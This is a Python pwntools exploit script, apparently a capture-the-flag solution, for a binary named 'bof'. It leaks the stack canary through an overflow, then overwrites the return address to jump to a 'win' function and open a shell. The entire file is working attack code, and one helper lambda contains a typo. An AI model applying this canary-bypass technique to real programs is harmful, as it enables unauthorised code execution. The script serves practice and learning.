#!/usr/bin/env python3

from pwn import *

exe = ELF('bof', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
b* 0x000000000040120a
b* 0x0000000000401229
b* 0x0000000000401257
b* 0x00000000004011d0
        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()

payload = b'a' *73

sa(b'get shell\n', payload)
p.recv(86)
canary = u64(b'\x00' +p.recv(7))
log.info("Canary: " + hex(canary))

payload = b'b'*72
payload += p64(canary)
payload += p64(0xdeadbeaf)
payload += p64(exe.sym.win+1)
sla(b'u:\n',payload)
p.interactive()
